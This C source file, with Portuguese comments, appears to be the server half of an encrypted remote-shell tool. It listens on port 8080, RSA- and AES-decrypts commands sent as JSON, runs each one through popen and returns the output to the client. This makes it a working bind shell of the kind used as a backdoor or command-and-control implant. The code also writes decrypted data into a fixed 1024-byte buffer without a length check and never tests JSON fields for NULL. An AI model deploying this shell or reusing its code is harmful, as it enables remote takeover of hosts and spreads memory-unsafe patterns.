#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>

#include <cjson/cJSON.h>

#define PORT 8080

// Função para decodificar base64
unsigned char *base64_decode(const char *input, int *len)
{
    BIO *b64, *bmem;
    int input_len = strlen(input);
    unsigned char *buffer = malloc(input_len);
    memset(buffer, 0, input_len);

    b64 = BIO_new(BIO_f_base64());
    bmem = BIO_new_mem_buf((void *)input, input_len);
    bmem = BIO_push(b64, bmem);
    BIO_set_flags(bmem, BIO_FLAGS_BASE64_NO_NL);
    *len = BIO_read(bmem, buffer, input_len);
    BIO_free_all(bmem);

    return buffer;
}

// Executa o comando e envia a saída de volta
void execute_command(const char *cmd, int client_sock)
{
    FILE *fp = popen(cmd, "r");
    if (!fp)
    {
        char *err = "Erro ao executar comando\n";
        send(client_sock, err, strlen(err), 0);
        return;
    }

    char output[1024];
    while (fgets(output, sizeof(output), fp) != NULL)
    {
        send(client_sock, output, strlen(output), 0);
    }

    pclose(fp);
}

int main()
{
    int sockfd, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    char buffer[4096];

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr));
    listen(sockfd, 1);

    printf("🔐 Servidor escutando na porta %d...\n", PORT);

    client_sock = accept(sockfd, (struct sockaddr *)&client_addr, &client_len);
    printf("✅ Cliente conectado!\n");

    while (1)
    {
        memset(buffer, 0, sizeof(buffer));
        int recv_len = recv(client_sock, buffer, sizeof(buffer), 0);
        if (recv_len <= 0)
        {
            printf("⚠️ Cliente desconectado ou erro na recepção.\n");
            break;
        }

        cJSON *json = cJSON_Parse(buffer);
        if (!json)
        {
            fprintf(stderr, "❌ Erro ao parsear JSON\n");
            continue;
        }

        const char *keyblob_b64 = cJSON_GetObjectItem(json, "keyblob")->valuestring;
        const char *payload_b64 = cJSON_GetObjectItem(json, "payload")->valuestring;

        int key_iv_len;
        unsigned char *key_iv_enc = base64_decode(keyblob_b64, &key_iv_len);

        FILE *priv_file = fopen("private.pem", "r");
        if (!priv_file)
        {
            fprintf(stderr, "❌ Erro ao abrir private.pem\n");
            cJSON_Delete(json);
            free(key_iv_enc);
            continue;
        }

        RSA *rsa = PEM_read_RSAPrivateKey(priv_file, NULL, NULL, NULL);
        fclose(priv_file);

        unsigned char key_iv[48];
        RSA_private_decrypt(key_iv_len, key_iv_enc, key_iv, rsa, RSA_PKCS1_OAEP_PADDING);
        RSA_free(rsa);
        free(key_iv_enc);

        unsigned char aes_key[32], aes_iv[16];
        memcpy(aes_key, key_iv, 32);
        memcpy(aes_iv, key_iv + 32, 16);

        int payload_len;
        unsigned char *payload_enc = base64_decode(payload_b64, &payload_len);

        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
        unsigned char plaintext[1024];
        int len, plaintext_len;

        EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key, aes_iv);
        EVP_DecryptUpdate(ctx, plaintext, &len, payload_enc, payload_len);
        plaintext_len = len;
        EVP_DecryptFinal_ex(ctx, plaintext + len, &len);
        plaintext_len += len;
        EVP_CIPHER_CTX_free(ctx);
        free(payload_enc);

        plaintext[plaintext_len] = '\0';

        printf("📥 Comando recebido: %s\n", plaintext);

        if (strcmp((char *)plaintext, "exit") == 0)
        {
            printf("🚪 Cliente solicitou saída. Encerrando conexão.\n");
            cJSON_Delete(json);
            break;
        }

        execute_command((char *)plaintext, client_sock);

        cJSON_Delete(json);
    }

    close(client_sock);
    close(sockfd);

    return 0;
}
